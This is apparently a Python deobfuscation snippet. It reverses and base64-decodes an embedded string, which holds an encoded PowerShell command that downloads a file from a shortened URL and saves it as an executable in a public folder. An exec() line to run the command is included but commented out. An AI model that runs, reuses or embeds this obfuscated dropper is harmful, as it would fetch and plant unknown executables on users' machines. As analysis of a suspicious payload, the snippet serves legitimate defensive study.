import base64

# The original encoded string
FBtFFDr8NXp5 = "=oQDiUGel5SYjF2YiASZslmR0V3TtASKpkiI90zZhFDbuJGc5MEZoVzQilnVIRWe5cUY6lTeMZTTINGMShUYigyZulmc0NFN2U2chJUbvJnR6oTX0JXZ252bD5SblR3c5N1WocmbpJHdTRXZH5COGRVV6oTXn5Wak92YuVkL0hXZU5SblR3c5N1WoASayVVLgQ3clVXclJlYldVLlt2b25WS"

# Step 1: Reverse the string
reversed_string = FBtFFDr8NXp5[::-1]

# Step 2: Decode from Base64
decoded_bytes = base64.b64decode(reversed_string)
decoded_command = decoded_bytes.decode('utf-8')

# Step 3: Execute the decoded command (caution advised)
# You can execute the command using exec or subprocess
print("Decoded command:")
print(decoded_command)

# Uncomment below to execute the command (use with caution)
# exec(decoded_command)

# output
# aHR0cHM6Ly9zaG9ydHVybC5hdC9pbnl1ag==
# Decoded: https://shorturl.at/inyuj